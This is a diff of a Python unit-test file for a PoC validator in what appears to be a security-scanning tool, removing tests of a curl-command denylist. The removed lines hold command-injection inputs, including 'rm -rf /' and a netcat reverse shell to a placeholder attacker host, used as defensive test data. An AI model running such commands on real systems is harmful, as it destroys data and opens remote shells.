@@ -655,17 +655,12 @@ class TestPocValidator(unittest.TestCase):
         _, conf, _ = pv._clamp_confidence(True, 150, "")
         self.assertEqual(conf, 99)
 
-    def test_sanitize_nuclei_curl_rejects_injection(self):
+    def test_sanitize_nuclei_curl_function_removed(self):
+        # A denylist frágil foi removida: o curl-command do Nuclei nunca é
+        # confiado/encaminhado; o curl é sempre reconstruído com shlex.quote.
         import poc_validator as pv
-        self.assertIsNone(pv._sanitize_nuclei_curl("curl 'http://x'; rm -rf /"))
-        self.assertIsNone(pv._sanitize_nuclei_curl("curl $(whoami)"))
-        self.assertIsNone(pv._sanitize_nuclei_curl("curl `id`"))
-        self.assertIsNone(pv._sanitize_nuclei_curl("nc -e /bin/sh attacker 4444"))
-
-    def test_sanitize_nuclei_curl_accepts_benign(self):
-        import poc_validator as pv
-        cmd = "curl -sk 'https://target.com/?id=1&q=2'"
-        self.assertEqual(pv._sanitize_nuclei_curl(cmd), cmd)
+        self.assertFalse(hasattr(pv, "_sanitize_nuclei_curl"))
+        self.assertFalse(hasattr(pv, "_CMD_INJECTION_RE"))
 
     def test_build_safe_baseline_neutralizes_single_quote_sqli(self):
         import poc_validator as pv
